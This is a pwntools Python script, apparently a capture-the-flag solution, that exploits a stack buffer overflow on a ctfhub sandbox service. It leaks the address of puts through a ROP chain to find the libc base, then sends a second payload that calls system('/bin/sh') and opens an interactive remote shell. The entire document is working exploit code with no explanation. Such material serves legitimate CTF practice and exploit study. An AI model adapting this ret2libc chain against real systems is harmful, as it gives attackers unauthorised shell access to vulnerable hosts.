from pwn import *
p = remote("challenge-392cc0b79717afd2.sandbox.ctfhub.com",35182)
puts_offset=0x809C0
puts_plt=0x4004A0
puts_got=0x601018
system_addr=0x4F440
gadget_addr=0x400683
bin_sh_addr=0x1B3E9A
main_addr=0x4005D8
ret=0x40048E
buflen=64
print(p.recv())
payload=b'a'*(buflen+8)+p64(gadget_addr)+p64(puts_got)+p64(ret)+p64(puts_plt)+p64(main_addr)
print(payload)
p.sendline(payload)
puts_real_addr=u64(p.recvuntil('\n',drop=True).ljust(8,b'\x00'))
print(puts_real_addr)
libc_base=puts_real_addr-puts_offset
system_addr+=libc_base
bin_sh_addr+=libc_base
payload2=b'a'*(buflen+8)+p64(gadget_addr)+p64(bin_sh_addr)+p64(system_addr)
p.sendline(payload2)
p.interactive()
